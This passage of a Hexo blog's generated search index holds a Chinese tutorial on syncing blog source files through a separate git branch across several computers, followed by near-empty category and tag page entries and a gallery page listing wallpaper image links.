</span><br><span class="line">plugins:   </span><br><span class="line">- markdown-it-abbr   </span><br><span class="line">- markdown-it-footnote   </span><br><span class="line">- markdown-it-ins    </span><br><span class="line">- markdown-it-sub    </span><br><span class="line">- markdown-it-sup    </span><br><span class="line">- markdown-it-emoji  &#x2F;&#x2F;用emoji插件  </span><br></pre></td></tr></table></figure><ul><li><code>hexo clean</code> &amp;&amp; <code>hexo deploy -g</code> 查看效果</li></ul><h2 id="git分支进行多终端工作"><a class="markdownIt-Anchor" href="#git分支进行多终端工作"></a> git分支进行多终端工作</h2><ul><li>利用git的分支系统，可以解决多个终端同时进行文件工作的问题，这样每次打开不一样的电脑，只需要进行简单的配置和在github上把文件同步下来，就可以无缝操作了。</li></ul><h3 id="机制"><a class="markdownIt-Anchor" href="#机制"></a> 机制</h3><ul><li>机制是这样的，由于<code>hexo d</code>上传部署到github的其实是hexo编译后的文件，是用来生成网页的，不包含源文件，没有<code>source</code>等源文件在内。</li><li>也就是上传的是在本地目录里自动生成的<code>.deploy_git</code>里面。</li><li>其他文件 ，包括我们写在<code>source</code>里面的，和配置文件，主题文件，都没有上传到github。所以可以利用git的分支管理，将源文件上传到github的另一个分支即可。</li></ul><h3 id="上传分支"><a class="markdownIt-Anchor" href="#上传分支"></a> 上传分支</h3><ul><li>首先，先在github上新建一个hexo分支，如图：<br /><img src="/images/pasted-3.png" alt="github新建分支" /></li><li>然后在这个仓库的settings中，选择默认分支为hexo分支（这样每次同步的时候就不用指定分支，比较方便）。<br /><img src="/images/pasted-4.png" alt="设置默认分支为hexo" /></li><li>然后在本地的任意目录下，打开git bash，</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone git@github.com:ZJUFangzh&#x2F;ZJUFangzh.github.io.git</span><br></pre></td></tr></table></figure><ul><li>将其克隆到本地，因为默认分支已经设成了hexo，所以clone时只clone了hexo。</li><li>接下来在克隆到本地的ZJUFangzh.github.io中，把除了.git 文件夹外的所有文件都删掉</li><li>把之前我们写的博客源文件全部复制过来，除了.deploy_git。这里应该说一句，复制过来的源文件应该有一个.gitignore，用来忽略一些不需要的文件，如果没有的话，自己新建一个，在里面写上如下，表示这些类型文件不需要git：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.DS_Store</span><br><span class="line">Thumbs.db</span><br><span class="line">db.json</span><br><span class="line">*.log</span><br><span class="line">node_modules&#x2F;</span><br><span class="line">public&#x2F;</span><br><span class="line">.deploy*&#x2F;</span><br></pre></td></tr></table></figure><ul><li>注意，如果你之前克隆过theme中的主题文件，那么应该把主题文件中的.git文件夹删掉，因为git不能嵌套上传，最好是显示隐藏文件，检查一下有没有，否则上传的时候会出错，导致你的主题文件无法上传，这样你的配置在别的电脑上就用不了了。</li><li>而后</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit –m &quot;add branch&quot;</span><br><span class="line">git push</span><br></pre></td></tr></table></figure><ul><li>这样就上传完了，可以去你的github上看一看hexo分支有没有上传上去，其中node_modules、public、db.json已经被忽略掉了，没有关系，不需要上传的，因为在别的电脑上需要重新输入命令安装 。<br /><img src="/images/pasted-5.png" alt="代码上传完成的目录" /></li><li>这样就上传完了。</li></ul><h3 id="更换电脑操作"><a class="markdownIt-Anchor" href="#更换电脑操作"></a> 更换电脑操作</h3><ul><li>一样的，跟之前的环境搭建一样，<ul><li>安装git：</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure><ul><li>设置git全局邮箱和用户名</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;yourgithubname&quot;</span><br><span class="line">git config --global user.email &quot;yourgithubemail&quot;</span><br></pre></td></tr></table></figure><ul><li>设置ssh key</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;youremail&quot;</span><br><span class="line">#生成后填到github和coding上（有coding平台的话）</span><br><span class="line">#验证是否成功</span><br><span class="line">ssh -T git@github.com</span><br><span class="line">ssh -T git@git.coding.net #(有coding平台的话)</span><br></pre></td></tr></table></figure><ul><li>安装nodejs</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install nodejs</span><br><span class="line">sudo apt-get install npm</span><br></pre></td></tr></table></figure><ul><li>安装hexo</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo npm install hexo-cli -g</span><br></pre></td></tr></table></figure><ul><li>但是已经不需要初始化了，直接在任意文件夹下，</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone git@………………</span><br></pre></td></tr></table></figure><ul><li>然后进入克隆到的文件夹：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd xxx.github.io</span><br><span class="line">npm install</span><br><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><ul><li>生成，部署：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><ul><li>然后就可以开始写你的新博客了</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new newpage</span><br></pre></td></tr></table></figure><ul><li>Tips:<ul><li>不要忘了，每次写完最好都把源文件上传一下</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit –m &quot;xxxx&quot;</span><br><span class="line">git push</span><br></pre></td></tr></table></figure><ul><li>如果是在已经编辑过的电脑上，已经有clone文件夹了，那么，每次只要和远端同步一下就行了</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git pull</span><br></pre></td></tr></table></figure><h2 id="博客网站优化"><a class="markdownIt-Anchor" href="#博客网站优化"></a> 博客网站优化</h2><ul><li>网站推广不是我的重点，之后的具体内容可以原文：<a href="https://blog.csdn.net/sinat_37781304/article/details/82729029">文章链接</a></li></ul><h3 id="seo"><a class="markdownIt-Anchor" href="#seo"></a> SEO</h3><ul><li>百度SEO</li><li>谷歌SEO</li></ul><h3 id="网站统计"><a class="markdownIt-Anchor" href="#网站统计"></a> 网站统计</h3><ul><li>百度统计</li><li>leanCloud文章阅读量统计</li><li>不蒜子访问量人次统计</li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> common </category>
          
      </categories>
      
      
        <tags>
            
            <tag> skills </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>Gallery</title>
      <link href="/gallery/index.html"/>
      <url>/gallery/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script>    <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/wallpaper/2020-06-02/5ed5b0bee4f0b_270_185.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/wallpaper/2020-06-02/5ed5b0bee4f0b_270_185.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/wallpaper/2020-06-02/5ed5ae403436f_270_185.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/wallpaper/2020-06-02/5ed5ae403436f_270_185.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/wallpaper/2020-06-02/5ed5aa77c29ef_270_185.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/wallpaper/2020-06-02/5ed5aa77c29ef_270_185.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/wallpaper/2020-06-01/5ed4cf014b3da_270_185.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/wallpaper/2020-06-01/5ed4cf014b3da_270_185.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/wallpaper/2020-06-01/5ed4bf7e24530_270_185.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/wallpaper/2020-06-01/5ed4bf7e24530_270_185.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/wallpaper/2020-06-01/5ed4a2377df0d_270_185.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/wallpaper/2020-06-01/5ed4a2377df0d_270_185.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/wallpaper/2020-06-01/5ed4990460259_270_185.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/wallpaper/2020-06-01/5ed4990460259_270_185.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/wallpaper/2020-06-01/5ed496ebac85c_270_185.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/wallpaper/2020-06-01/5ed496ebac85c_270_185.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/wallpaper/2020-06-01/5ed4955fbd0a2_270_185.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/wallpaper/2020-06-01/5ed4955fbd0a2_270_185.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/wallpaper/2020-06-01/5ed4936521d40_270_185.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/wallpaper/2020-06-01/5ed4936521d40_270_185.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/wallpaper/2020-06-01/5ed490b68bcc5_270_185.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/wallpaper/2020-06-01/5ed490b68bcc5_270_185.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/wallpaper/2020-06-01/5ed48e427f35c_270_185.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/wallpaper/2020-06-01/5ed48e427f35c_270_185.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/wallpaper/2020-06-01/5ed4754df17a8_270_185.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/wallpaper/2020-06-01/5ed4754df17a8_270_185.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/wallpaper/2020-06-01/5ed47344e1978_270_185.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/wallpaper/2020-06-01/5ed47344e1978_270_185.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/wallpaper/2020-06-01/5ed472dc034e5_270_185.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/wallpaper/2020-06-01/5ed472dc034e5_270_185.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/wallpaper/2020-06-01/5ed472579de4d_270_185.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/wallpaper/2020-06-01/5ed472579de4d_270_185.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/wallpaper/2020-06-01/5ed46b2b897af_270_185.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/wallpaper/2020-06-01/5ed46b2b897af_270_185.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/wallpaper/2020-06-01/5ed467469beb7_270_185.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/wallpaper/2020-06-01/5ed467469beb7_270_185.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/wallpaper/2020-06-01/5ed4617bea112_270_185.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/wallpaper/2020-06-01/5ed4617bea112_270_185.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/wallpaper/2020-06-01/5ed45dbe71944_270_185.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/wallpaper/2020-06-01/5ed45dbe71944_270_185.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/wallpaper/2020-05-29/5ed0d93dae888_270_185.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/wallpaper/2020-05-29/5ed0d93dae888_270_185.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/wallpaper/2020-05-29/5ed0d75734bf5_270_185.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/wallpaper/2020-05-29/5ed0d75734bf5_270_185.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/wallpaper/2020-05-29/5ed0ce5b5432c_270_185.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/wallpaper/2020-05-29/5ed0ce5b5432c_270_185.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/wallpaper/2020-05-29/5ed0c3732c7b4_270_185.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/wallpaper/2020-05-29/5ed0c3732c7b4_270_185.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/tj/2020-04-26/5ea4f9e03c0cd.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/tj/2020-04-26/5ea4f9e03c0cd.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/tj/2020-04-02/5e85577ed3788.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/tj/2020-04-02/5e85577ed3788.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/tj/2020-03-04/5e5f2574143e0.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/tj/2020-03-04/5e5f2574143e0.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/tj/2020-05-28/5ecf16ca92082.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/tj/2020-05-28/5ecf16ca92082.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://pic1.win4000.com/tj/2020-06-01/5ed45dc822d79.jpg')"      data-title="demo"      data-url="http://pic1.win4000.com/tj/2020-06-01/5ed45dc822d79.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx3.sinaimg.cn/mw600/0085KTY1gy1gg1ulq0bgvj30u018y1ky.jpg')"      data-title="demo"      data-url="http://wx3.sinaimg.cn/mw600/0085KTY1gy1gg1ulq0bgvj30u018y1ky.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx3.sinaimg.cn/mw600/0085KTY1gy1gg1nnz59n4j31400u04qq.jpg')"      data-title="demo"      data-url="http://wx3.sinaimg.cn/mw600/0085KTY1gy1gg1nnz59n4j31400u04qq.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx1.sinaimg.cn/mw600/0085KTY1gy1gg1lxe9qk5j31400u0qv6.jpg')"      data-title="demo"      data-url="http://wx1.sinaimg.cn/mw600/0085KTY1gy1gg1lxe9qk5j31400u0qv6.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx4.sinaimg.cn/mw600/0085KTY1gy1gg1jspe2q2j318g0tnkbz.jpg')"      data-title="demo"      data-url="http://wx4.sinaimg.cn/mw600/0085KTY1gy1gg1jspe2q2j318g0tnkbz.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx1.sinaimg.cn/mw600/0085KTY1gy1gg1jscby5qj30tn18gkjl.jpg')"      data-title="demo"      data-url="http://wx1.sinaimg.cn/mw600/0085KTY1gy1gg1jscby5qj30tn18gkjl.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx3.sinaimg.cn/mw600/0085KTY1gy1gg1jqug1d2j30u018z7wh.jpg')"      data-title="demo"      data-url="http://wx3.sinaimg.cn/mw600/0085KTY1gy1gg1jqug1d2j30u018z7wh.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx1.sinaimg.cn/mw600/0085KTY1gy1gg1jnvl3psj30u018zhdt.jpg')"      data-title="demo"      data-url="http://wx1.sinaimg.cn/mw600/0085KTY1gy1gg1jnvl3psj30u018zhdt.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx4.sinaimg.cn/mw600/0085KTY1gy1gg1jmreqtjj30u016gnpf.jpg')"      data-title="demo"      data-url="http://wx4.sinaimg.cn/mw600/0085KTY1gy1gg1jmreqtjj30u016gnpf.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx3.sinaimg.cn/mw600/0085KTY1gy1gg1jm0ue9vj30u018zhdt.jpg')"      data-title="demo"      data-url="http://wx3.sinaimg.cn/mw600/0085KTY1gy1gg1jm0ue9vj30u018zhdt.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx2.sinaimg.cn/mw600/0076BSS5ly1gg1hy9zfrlj30go0p0tnp.jpg')"      data-title="demo"      data-url="http://wx2.sinaimg.cn/mw600/0076BSS5ly1gg1hy9zfrlj30go0p0tnp.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx2.sinaimg.cn/mw600/0076BSS5ly1gg1htm1gbcj30u018yjza.jpg')"      data-title="demo"      data-url="http://wx2.sinaimg.cn/mw600/0076BSS5ly1gg1htm1gbcj30u018yjza.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx4.sinaimg.cn/mw600/0076BSS5ly1gg1ho3e9g9j30rs0ijdv8.jpg')"      data-title="demo"      data-url="http://wx4.sinaimg.cn/mw600/0076BSS5ly1gg1ho3e9g9j30rs0ijdv8.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx2.sinaimg.cn/mw600/0076BSS5ly1gg1hj4uitfj30u019018n.jpg')"      data-title="demo"      data-url="http://wx2.sinaimg.cn/mw600/0076BSS5ly1gg1hj4uitfj30u019018n.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx4.sinaimg.cn/mw600/0076BSS5ly1gg1h943uz6j30u018z7uv.jpg')"      data-title="demo"      data-url="http://wx4.sinaimg.cn/mw600/0076BSS5ly1gg1h943uz6j30u018z7uv.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx4.sinaimg.cn/mw600/0076BSS5ly1gg1gytqga8j31900u01ct.jpg')"      data-title="demo"      data-url="http://wx4.sinaimg.cn/mw600/0076BSS5ly1gg1gytqga8j31900u01ct.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx1.sinaimg.cn/mw600/0076BSS5ly1gg1gtcr96lj30u00u00yi.jpg')"      data-title="demo"      data-url="http://wx1.sinaimg.cn/mw600/0076BSS5ly1gg1gtcr96lj30u00u00yi.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx3.sinaimg.cn/mw600/0076BSS5ly1gg1gnef7a2j30m80xcn4l.jpg')"      data-title="demo"      data-url="http://wx3.sinaimg.cn/mw600/0076BSS5ly1gg1gnef7a2j30m80xcn4l.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx3.sinaimg.cn/mw600/0076BSS5ly1gg1ghqz7t3j30u019bnnt.jpg')"      data-title="demo"      data-url="http://wx3.sinaimg.cn/mw600/0076BSS5ly1gg1ghqz7t3j30u019bnnt.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx4.sinaimg.cn/mw600/0076BSS5ly1gg1gdb0nxgj30u0189b2b.jpg')"      data-title="demo"      data-url="http://wx4.sinaimg.cn/mw600/0076BSS5ly1gg1gdb0nxgj30u0189b2b.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx2.sinaimg.cn/mw600/0076BSS5ly1gg1g7cza83j30u018y1kx.jpg')"      data-title="demo"      data-url="http://wx2.sinaimg.cn/mw600/0076BSS5ly1gg1g7cza83j30u018y1kx.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx3.sinaimg.cn/mw1024/0076BSS5ly1gg16uvftotg307i056tt1.gif')"      data-title="demo"      data-url="http://wx3.sinaimg.cn/mw1024/0076BSS5ly1gg16uvftotg307i056tt1.gif"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx3.sinaimg.cn/mw600/0076BSS5ly1gg10bp2jykj30jz0zkgrf.jpg')"      data-title="demo"      data-url="http://wx3.sinaimg.cn/mw600/0076BSS5ly1gg10bp2jykj30jz0zkgrf.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx3.sinaimg.cn/mw600/0076BSS5ly1gg1067ok7lj30p40zkwhk.jpg')"      data-title="demo"      data-url="http://wx3.sinaimg.cn/mw600/0076BSS5ly1gg1067ok7lj30p40zkwhk.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx4.sinaimg.cn/mw600/0076BSS5ly1gg1004apo1j30m60x6n6y.jpg')"      data-title="demo"      data-url="http://wx4.sinaimg.cn/mw600/0076BSS5ly1gg1004apo1j30m60x6n6y.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx1.sinaimg.cn/mw600/0076BSS5ly1gg0zpan3gvj31400u045u.jpg')"      data-title="demo"      data-url="http://wx1.sinaimg.cn/mw600/0076BSS5ly1gg0zpan3gvj31400u045u.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx2.sinaimg.cn/mw600/0076BSS5ly1gg0z76iqhtj30pa11vjxk.jpg')"      data-title="demo"      data-url="http://wx2.sinaimg.cn/mw600/0076BSS5ly1gg0z76iqhtj30pa11vjxk.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx1.sinaimg.cn/mw600/0076BSS5ly1gg0z1sdpvpj30p011in0f.jpg')"      data-title="demo"      data-url="http://wx1.sinaimg.cn/mw600/0076BSS5ly1gg0z1sdpvpj30p011in0f.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx4.sinaimg.cn/mw600/0076BSS5ly1gg0yw9k9jwj30jg0t7toc.jpg')"      data-title="demo"      data-url="http://wx4.sinaimg.cn/mw600/0076BSS5ly1gg0yw9k9jwj30jg0t7toc.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx2.sinaimg.cn/mw600/0076BSS5ly1gg0yrcikzlj30u0190b2b.jpg')"      data-title="demo"      data-url="http://wx2.sinaimg.cn/mw600/0076BSS5ly1gg0yrcikzlj30u0190b2b.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx1.sinaimg.cn/mw600/0076BSS5ly1gg0ymeckopj30jg0t61cb.jpg')"      data-title="demo"      data-url="http://wx1.sinaimg.cn/mw600/0076BSS5ly1gg0ymeckopj30jg0t61cb.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx4.sinaimg.cn/mw600/0076BSS5ly1gg0ybuw0jlj30u01aq7hc.jpg')"      data-title="demo"      data-url="http://wx4.sinaimg.cn/mw600/0076BSS5ly1gg0ybuw0jlj30u01aq7hc.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx2.sinaimg.cn/mw600/0076BSS5ly1gg0y77tfrtj30u0190h4b.jpg')"      data-title="demo"      data-url="http://wx2.sinaimg.cn/mw600/0076BSS5ly1gg0y77tfrtj30u0190h4b.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx2.sinaimg.cn/mw600/0076BSS5ly1gg0y18wndqj30u0190b2c.jpg')"      data-title="demo"      data-url="http://wx2.sinaimg.cn/mw600/0076BSS5ly1gg0y18wndqj30u0190b2c.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx4.sinaimg.cn/mw600/0076BSS5ly1gg0xwquci7j30xc0m8q6z.jpg')"      data-title="demo"      data-url="http://wx4.sinaimg.cn/mw600/0076BSS5ly1gg0xwquci7j30xc0m8q6z.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx1.sinaimg.cn/mw600/0076BSS5ly1gg0xqu4vf1j318z0u0nk2.jpg')"      data-title="demo"      data-url="http://wx1.sinaimg.cn/mw600/0076BSS5ly1gg0xqu4vf1j318z0u0nk2.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx3.sinaimg.cn/mw600/0076BSS5ly1gg0xfhy1coj31af0u0agk.jpg')"      data-title="demo"      data-url="http://wx3.sinaimg.cn/mw600/0076BSS5ly1gg0xfhy1coj31af0u0agk.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx2.sinaimg.cn/mw600/0076BSS5ly1gg0x55hdv2j30pa0iy43b.jpg')"      data-title="demo"      data-url="http://wx2.sinaimg.cn/mw600/0076BSS5ly1gg0x55hdv2j30pa0iy43b.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('http://wx3.sinaimg.cn/mw600/0076BSS5ly1gg0wzlc7jlj30cb0h4wfc.jpg')"      data-title="demo"      data-url="http://wx3.sinaimg.cn/mw600/0076BSS5ly1gg0wzlc7jlj30cb0h4wfc.jpg"    >      <div class="gallery-item__title">        demo      </div>    </div>      <div      class="gallery-item"      style="background-image: url('/images/bikaqiu.jpeg')"      data-title="demo"      data-url="/images/bikaqiu.jpeg"    >      <div class="gallery-item__title">        demo      </div>    </div>  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
